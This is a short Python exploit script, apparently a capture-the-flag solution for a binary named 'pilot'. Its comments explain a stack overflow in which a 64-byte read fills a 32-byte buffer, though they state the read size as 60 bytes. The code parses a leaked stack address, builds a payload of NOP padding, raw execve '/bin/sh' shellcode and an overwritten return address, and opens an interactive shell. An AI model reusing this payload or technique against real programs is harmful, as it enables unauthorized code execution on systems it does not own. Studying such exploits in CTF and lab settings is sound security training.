#!/usr/bin/python3
'''
Took a bit more time since it is a stripped binary, and some shellcode didn't work
Managed to find the main function in Ghidra even though the symbol was stripped.
We know that the vulnerability is here: sVar1 = read(0,local_28,0x40);
local_28 only has 32 bytes, read syscall reads in 60 bytes

When we run the program, it prints out the mem address of local_28, this changes at runtime however.
Need to grab this addr, overflow the local buffer, overflow rbp, rewrite rip with the mem addr we found,
inject the shellcode in between.

Shell popped!
'''
import pwn as p

def pwn():
    start = p.process('./pilot')
    # Grab the address of the local variable displayed by the program
    line1 = start.recvlines(7)
    loc = line1[6:7]
    loc = loc[0].decode('utf-8')
    varAddr = loc[12:] # <- concat local var address

    # Craft payload
    shellcode = b'\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05' #24 bytes
    payload = b'\x90'*8 + shellcode + b'\x90'*8 + p.p64(int(varAddr, 16)) # 8 + 24 + 8 + 8 = 40 = 0x28 = offset

    # Send payload
    start.sendline(payload)
    start.interactive()

if __name__ == "__main__":
    pwn()
